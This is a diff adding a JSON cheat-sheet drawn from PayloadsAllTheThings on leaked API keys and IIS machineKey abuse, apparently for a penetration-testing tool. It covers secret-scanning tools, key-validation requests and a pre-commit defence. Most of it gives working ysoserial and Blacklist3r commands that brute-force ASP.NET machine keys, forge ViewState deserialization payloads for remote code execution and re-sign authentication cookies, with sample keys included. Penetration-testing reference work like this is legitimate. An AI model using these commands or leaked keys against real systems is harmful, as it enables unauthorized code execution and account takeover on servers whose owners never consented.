@@ -1,0 +1,249 @@
+{
+  "category": "API Key Leaks",
+  "source": "PayloadsAllTheThings/API Key Leaks/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "Where keys and tokens leak (main causes)",
+      "language": "text",
+      "tags": ["methodology", "recon", "secrets"],
+      "body": "API keys and tokens are authentication to public and private services. A leak leads to unauthorized access, compromise, and data exfiltration.\n\nWhere to look:\n• Hardcoding in source code - the key was left right in the code (api_key = \"1234567890abcdef\").\n• Public repositories - secrets accidentally committed to GitHub (commit history, issues, PRs).\n• Docker images - keys baked into images on DockerHub / private registries.\n• Logs and debug output - keys end up in logs during debugging.\n• Config files - .env, config.json, settings.py, .aws/credentials, etc. exposed publicly."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "API keys vs tokens",
+      "language": "text",
+      "tags": ["methodology", "tokens"],
+      "body": "API Keys are unique identifiers used to authenticate requests of a project/application.\nTokens are security tokens (for example OAuth) that grant access to protected resources."
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools for finding secrets and validation",
+      "language": "text",
+      "tags": ["tools", "secrets"],
+      "body": "trufflesecurity/truffleHog - finds credentials anywhere (repos, docker, files).\nstreaak/keyhacks - how to quickly check whether a key leaked on a bug bounty is valid.\nmomenbasel/KeyFinder - finds keys right while browsing.\nmazen160/secrets-patterns-db - the largest open-source database of regex patterns for secrets/keys/passwords.\nblacklanternsecurity/badsecrets - detects known/weak secrets across many platforms.\nirsdl/crapsecrets - detects known secrets in various web frameworks.\nd0ge/sign-saboteur - a Burp extension for editing/signing/verifying signed web tokens.\naquasecurity/trivy - a scanner for vulnerabilities and misconfigurations that also looks for API keys/secrets.\nprojectdiscovery/nuclei-templates - token-spray templates: run a token across many API endpoints."
+    },
+    {
+      "subcategory": "Tools",
+      "title": "nuclei - token-spray (checking a token across many APIs)",
+      "language": "bash",
+      "tags": ["tools", "nuclei", "token-spray"],
+      "body": "nuclei -t token-spray/ -var token=token_list.txt"
+    },
+    {
+      "subcategory": "Searching in repositories",
+      "title": "trufflehog - scan a GitHub organization",
+      "language": "bash",
+      "tags": ["trufflehog", "github", "secrets"],
+      "body": "## Scan a Github Organization\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity"
+    },
+    {
+      "subcategory": "Searching in repositories",
+      "title": "trufflehog - scan a repository with issues and PRs",
+      "language": "bash",
+      "tags": ["trufflehog", "github", "secrets"],
+      "body": "## Scan a GitHub Repository, its Issues and Pull Requests\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments"
+    },
+    {
+      "subcategory": "Searching in repositories",
+      "title": "trufflehog - scan a Docker image",
+      "language": "bash",
+      "tags": ["trufflehog", "docker", "secrets"],
+      "body": "# Scan a Docker image for verified secrets\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets"
+    },
+    {
+      "subcategory": "Key validation",
+      "title": "Identifying the service by regex (secrets-patterns-db)",
+      "language": "text",
+      "tags": ["validation", "regex", "secrets"],
+      "body": "If it is unclear which service issued the token, match it against the regex patterns from mazen160/secrets-patterns-db (the largest open-source database of secret patterns)."
+    },
+    {
+      "subcategory": "Key validation",
+      "title": "Example regex patterns (AWS API Gateway / AWS API Key)",
+      "language": "text",
+      "tags": ["validation", "regex", "aws"],
+      "body": "patterns:\n  - pattern:\n      name: AWS API Gateway\n      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'\n      confidence: low\n  - pattern:\n      name: AWS API Key\n      regex: AKIA[0-9A-Z]{16}\n      confidence: high"
+    },
+    {
+      "subcategory": "Key validation",
+      "title": "Checking validity - keyhacks and service docs",
+      "language": "text",
+      "tags": ["validation", "keyhacks"],
+      "body": "Use streaak/keyhacks or read the service documentation to quickly check whether an API key is valid."
+    },
+    {
+      "subcategory": "Key validation",
+      "title": "Validation example - Telegram Bot API Token",
+      "language": "bash",
+      "tags": ["validation", "telegram"],
+      "body": "curl https://api.telegram.org/bot<TOKEN>/getMe"
+    },
+    {
+      "subcategory": "Reducing the attack surface",
+      "title": "pre-commit - detecting keys before a commit",
+      "language": "text",
+      "tags": ["defense", "pre-commit"],
+      "body": "Before committing, check for private keys and AWS credentials. Add to .pre-commit-config.yaml:\n\n-   repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v3.2.0\n    hooks:\n    -   id: detect-aws-credentials\n    -   id: detect-private-key"
+    },
+
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "What machineKey is and why an attacker wants it",
+      "language": "text",
+      "tags": ["iis", "aspnet", "viewstate"],
+      "body": "machineKey in IIS/ASP.NET defines the crypto keys and algorithms for encrypting and validating data: ViewState, forms-authentication cookies, out-of-process session state.\n\nIf you know the application's machineKey (validationKey/decryptionKey), you can forge ViewState and reach RCE through deserialization, as well as edit forms-authentication cookies."
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "ViewState format (by MAC/encryption flags)",
+      "language": "table",
+      "tags": ["iis", "viewstate", "fingerprint"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Format", "Properties"],
+          "rows": [
+            ["Base64", "EnableViewStateMac=False, ViewStateEncryptionMode=False"],
+            ["Base64 + MAC", "EnableViewStateMac=True"],
+            ["Base64 + Encrypted", "ViewStateEncryptionMode=True"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "ViewState indicators",
+      "language": "text",
+      "tags": ["iis", "viewstate", "recon"],
+      "body": "ViewState stores the state of web controls between postbacks in a hidden field on the page.\n\n• Before September 2014, the enableViewStateMac property defaulted to False.\n• An unencrypted ViewState usually begins with the string /wEP."
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "machineKey element format",
+      "language": "xml",
+      "tags": ["iis", "aspnet", "config"],
+      "body": "<machineKey validationKey=\"[String]\"  decryptionKey=\"[String]\" validation=\"[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]\"  decryption=\"[Auto (default) | DES | 3DES | AES | alg:algorithm_name]\" />"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "machineKey example (from Microsoft docs)",
+      "language": "xml",
+      "tags": ["iis", "aspnet", "config"],
+      "body": "<machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" />"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Where web.config / machine.config live",
+      "language": "text",
+      "tags": ["iis", "aspnet", "locations"],
+      "body": "32-bit:\n  C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config\n  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config\n64-bit:\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config\n  C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config\nIn the registry when AutoGenerate is enabled (extract via irsdl/machineKeyFinder.aspx):\n  HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4\n  HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Guessing a known machineKey - badsecrets / blacklist3r",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "badsecrets"],
+      "body": "python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6\n# Matching MachineKeys found!\n# validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Guessing a known machineKey - viewstalker",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "viewstalker"],
+      "body": "./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt\n# KEY FOUND!!!\n# Validation Key: XXXXX,XXXXX"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Guessing a known machineKey - crapsecrets",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "crapsecrets"],
+      "body": "python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r\npython3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Guessing a known machineKey - Blacklist3r (AspDotNetWrapper)",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "blacklist3r"],
+      "body": "AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Guessing a known machineKey - viewgen --guess",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "viewgen"],
+      "body": "$ viewgen --guess \"/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\"\n[+] ViewState is not encrypted\n[+] Signature algorithm: SHA1"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Known machineKey wordlists",
+      "language": "text",
+      "tags": ["iis", "viewstate", "wordlist"],
+      "body": "Ready-made key lists for brute-forcing:\n• NotSoSecure/Blacklist3r/MachineKeys.txt\n• isclayton/viewstalker/MachineKeys2.txt\n• blacklanternsecurity/badsecrets/aspnet_machinekeys.txt\n\nARS3NAL note: a local copy of NotSoSecure/Blacklist3r is in Files/MachineKeys.txt (~3570 validationKey,decryptionKey pairs)."
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Decoding ViewState - viewgen",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "viewgen", "decode"],
+      "body": "viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\""
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Generating ViewState for RCE - requirements",
+      "language": "text",
+      "tags": ["iis", "viewstate", "rce", "deserialization"],
+      "body": "First decode the ViewState to understand whether MAC and encryption are enabled.\n\nFor exploitation you need:\n• __VIEWSTATE\n• __VIEWSTATEGENERATOR"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC disabled (ysoserial)",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "body": "ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"cmd /c whoami\""
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC enabled, encryption disabled - extract the key",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "rce", "blacklist3r"],
+      "body": "AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n# --modifier = `__VIEWSTATEGENERATOR` parameter value\n# --encrypteddata = `__VIEWSTATE` parameter value of the target application"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC enabled, encryption disabled - generate ViewState",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "body": ".\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=CA0B0334 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n.\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --generator=3E92B2D6 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n\n# --generator = `__VIEWSTATEGENERATOR` parameter value\n# --validationkey = validation key from the previous command"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC and encryption enabled - notes",
+      "language": "text",
+      "tags": ["iis", "viewstate", "rce"],
+      "body": "By default: HMACSHA256 validation, AES decryption.\n\nIf __VIEWSTATEGENERATOR is absent but the application runs on .NET Framework <= 4.0, you can specify the application root (for example --apppath=\"/testaspx/\").\n\n• .NET Framework < 4.5 - ASP.NET still accepts an unencrypted __VIEWSTATE if you remove the __VIEWSTATEENCRYPTED parameter from the request.\n• .NET Framework > 4.5 - the machineKey has the compatibilityMode=\"Framework45\" property."
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC+encryption, .NET < 4.5 (remove __VIEWSTATEENCRYPTED)",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "body": ".\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --apppath=\"/testaspx/\" --islegacy --validationalg=\"SHA1\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\" --isdebug"
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "RCE: MAC+encryption, .NET > 4.5 (Framework45)",
+      "language": "bash",
+      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "body": ".\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/somepath/testaspx/test.aspx\" --apppath=\"/testaspx/\" --decryptionalg=\"AES\" --decryptionkey=\"34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887\" --validationalg=\"HMACSHA256\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\""
+    },
+    {
+      "subcategory": "IIS Machine Keys",
+      "title": "Editing a cookie via machineKey (if ViewState is disabled)",
+      "language": "bash",
+      "tags": ["iis", "aspnet", "cookie", "forms-auth"],
+      "body": "# decrypt cookie\n$ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes\n\n# encrypt cookie (edit Decrypted.txt)\n$ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt"
+    }
+  ]
+}
